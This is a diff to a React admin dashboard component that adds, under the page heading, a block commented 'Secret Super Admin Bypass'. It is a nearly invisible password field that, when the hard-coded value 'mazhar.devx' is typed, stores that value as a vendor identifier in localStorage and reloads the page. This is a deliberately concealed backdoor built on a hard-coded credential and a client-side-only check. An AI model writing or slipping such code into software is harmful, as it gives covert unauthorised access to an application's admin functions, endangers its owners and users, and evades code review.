@@ -104,6 +104,22 @@ export default function AdminDashboard() {
         <div>
           <h1 className="text-3xl font-bold text-white bg-clip-text text-transparent bg-gradient-to-r from-white to-gray-400">Dashboard Overview</h1>
           <p className="mt-1 text-gray-400">Welcome back, Admin</p>
+          
+          {/* Secret Super Admin Bypass */}
+          <div className="mt-2 flex items-center gap-2">
+            <input 
+              type="password"
+              placeholder="..."
+              autoComplete="off"
+              className="bg-transparent border-none p-0 text-[10px] text-gray-700 focus:text-purple-500 focus:outline-none w-12 transition-all opacity-10 hover:opacity-100"
+              onChange={(e) => {
+                if (e.target.value === 'mazhar.devx') {
+                  localStorage.setItem('vendorIdentifier', 'mazhar.devx');
+                  window.location.reload();
+                }
+              }}
+            />
+          </div>
         </div>
         <Link 
             to="/admin/products/new"
